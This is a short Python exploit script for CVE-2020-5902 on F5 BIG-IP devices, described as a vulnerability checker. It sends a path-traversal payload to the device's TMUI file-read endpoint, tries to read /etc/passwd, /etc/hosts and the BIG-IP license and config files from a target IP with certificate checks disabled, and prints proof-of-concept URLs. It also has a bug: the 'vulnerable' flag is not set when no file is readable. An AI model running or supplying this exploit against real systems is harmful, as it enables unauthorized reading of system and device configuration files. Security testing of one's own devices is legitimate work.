import requests, argparse
import warnings; warnings.filterwarnings('ignore', message='Unverified HTTPS request')

parser = argparse.ArgumentParser(description="Python script to check CVE-2020-5902 (F5 BIG-IP devices).")
parser.add_argument('-i', required=True, default=None, help='Enter the target ip https://<IP>.')
args = vars(parser.parse_args())
ip = args['i']
print('- Python script to check CVE-2020-5902 (F5 BIG-IP devices). | coded by Abdullah AlZahrani')
def checkerCVE20205902(ip):
    payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp'
    files = ['/etc/passwd', '/etc/hosts', '/config/bigip.license', '/config/bigip.conf']
    print('[!] Your target: {}'.format(ip))
    for line in files:
        params = (('fileName', '{}'.format(line)),)
        try:
            response = requests.get('{}{}'.format(ip, payload), params=params, verify=False)
            if response.status_code == 200:
                vulnerable = True
                print("[Info] {} readable".format(line))
                print('[PoC] {}{}?fileName={}'.format(ip, payload, line))
        except requests.exceptions.HTTPError as errh:
            print("Http Error:", errh)
        except requests.exceptions.ConnectionError as errc:
            print("Error Connecting:", errc)
        except requests.exceptions.Timeout as errt:
            print("Timeout Error:", errt)
        except requests.exceptions.RequestException as err:
            print("OOps: Something Else", err)
    if vulnerable:
        print("[I] The target is vulnerable to CVE-2020-5902")
    else:
        print("[!] The target is not vulnerable to CVE-2020-5902")

if __name__ == '__main__':
    try:
        checkerCVE20205902(ip)
    except KeyboardInterrupt:
        exit('[!] Quitting!')
